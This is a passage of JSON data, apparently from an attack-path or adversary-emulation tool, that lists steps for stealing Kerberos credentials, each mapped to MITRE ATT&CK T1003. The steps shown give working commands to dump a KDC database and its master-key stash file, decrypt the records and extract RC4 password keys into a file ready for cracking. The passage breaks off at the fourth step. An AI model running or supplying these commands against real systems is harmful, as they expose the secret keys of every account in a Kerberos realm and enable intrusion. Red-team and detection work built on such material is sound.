  "steps": [
    {
      "id": 1,
      "type": "edge",
      "name": "Dump Kerberos Database and Stash",
      "from": "kdc_host",
      "to": "dump_stash_artifacts",
      "icon": "IconDownload",
      "cli": "sudo kdb5_util dump -b7 kdc.dump && cp /etc/krb5kdc/stash stash",
      "description": "Export encrypted KDC data and key material required for downstream offline decryption.",
      "mitre": {
        "id": "T1003",
        "tactic": "Credential Access",
        "technique": "OS Credential Dumping"
      }
    },
    {
      "id": 2,
      "type": "edge",
      "name": "Decrypt and Parse Etype Records",
      "from": "dump_stash_artifacts",
      "to": "decryption_pipeline",
      "icon": "IconProcess",
      "cli": "hprop --database=kdc.dump --master-key=stash --source=mit-dump --decrypt --stdout | hpropd -n --print | grep -oP '23:\\K(.+?)(?=:)' > rc4.hex",
      "description": "Transform raw dump content into targeted crackable Kerberos etype records.",
      "mitre": {
        "id": "T1003",
        "tactic": "Credential Access",
        "technique": "OS Credential Dumping"
      }
    },
    {
      "id": 3,
      "type": "edge",
      "name": "Normalize Extracted Hash Material",
      "from": "decryption_pipeline",
      "to": "extracted_hash_file",
      "icon": "IconData",
      "cli": "tr '[:upper:]' '[:lower:]' < rc4.hex > hash",
      "description": "Canonicalize output format to ensure stable parser behavior in crack tools.",
      "mitre": {
        "id": "T1003",
        "tactic": "Credential Access",
        "technique": "OS Credential Dumping"
      }
    },
    {
      "id": 4,
